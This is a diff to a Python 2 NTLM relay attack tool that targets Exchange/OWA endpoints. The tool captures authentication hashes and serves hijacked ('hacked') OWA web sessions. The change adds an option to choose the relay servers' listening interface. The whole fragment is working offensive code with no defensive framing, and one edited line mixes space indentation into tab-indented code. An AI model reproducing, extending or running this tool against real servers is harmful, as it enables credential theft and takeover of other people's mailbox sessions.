@@ -31,8 +31,9 @@ def parseCommandLine():
 	parser.add_argument('-o', '--outfile', metavar="HASHES.txt", default = None, help='Store captured hashes in the provided file')
 	parser.add_argument('-l', metavar="IP", default = "127.0.0.1", help='Host to serve the hacked OWA web sessions on (default: 127.0.0.1)')
 	parser.add_argument('-p', metavar="port", default = 8000, help='Port to serve the hacked OWA web sessions on (default: 8000)')
+	parser.add_argument('-i', metavar="interface", default="0.0.0.0", help='Interface IP for relay servers to listen on (default: 0.0.0.0)')
 	args = parser.parse_args()
-	return args.t, args.outfile, args.l, args.p, args.c
+	return args.t, args.i, args.outfile, args.l, args.p, args.c
 
 def checkNTLM(url):
 	logging.info("Testing " + url + " for NTLM authentication support...")
@@ -50,7 +51,8 @@ def checkNTLM(url):
 	except Exception, e:
 		logging.error("[checkNTLM] " + str(e))
 
-def startServers(targetURL, hashOutputFile = None, serverIP = "127.0.0.1", serverPort = 8000):
+#def startServers(targetURL, hashOutputFile = None, serverIP = "127.0.0.1", serverPort = 8000, interface):
+def startServers(targetURL, interface, hashOutputFile = None, serverIP = "127.0.0.1", serverPort = 8000):
 	PoppedDB		= Manager().dict()	# A dict of PoppedUsers
 	PoppedDB_Lock	= Lock()			# A lock for opening the dict
 
@@ -66,7 +68,7 @@ def startServers(targetURL, hashOutputFile = None, serverIP = "127.0.0.1", serve
 		c.setOutputFile(hashOutputFile)
 		c.setMode('RELAY')
 		c.setAttacks(C_Attack)
-		c.setInterfaceIp("0.0.0.0")
+                c.setInterfaceIp(interface)
 		c.PoppedDB 		= PoppedDB 		# pass the poppedDB to the relay servers
 		c.PoppedDB_Lock = PoppedDB_Lock # pass the poppedDB to the relay servers
 		s = server(c)
@@ -89,7 +91,7 @@ def startServers(targetURL, hashOutputFile = None, serverIP = "127.0.0.1", serve
 
 if __name__ == "__main__":
 	banner()
-	targetURL, outputFile, serverIP, serverPort, justCheck = parseCommandLine()
+	targetURL, interface, outputFile, serverIP, serverPort, justCheck = parseCommandLine()
 
 	if targetURL[-1] == "/":
 		targetURL = targetURL + "EWS/Exchange.asmx"
@@ -101,12 +103,5 @@ if __name__ == "__main__":
 	if justCheck:
 		exit(0)
 
-	startServers(targetURL, outputFile, serverIP, serverPort)
+	startServers(targetURL, interface, outputFile, serverIP, serverPort)
 	pass
-
-
-
-
-
-
-
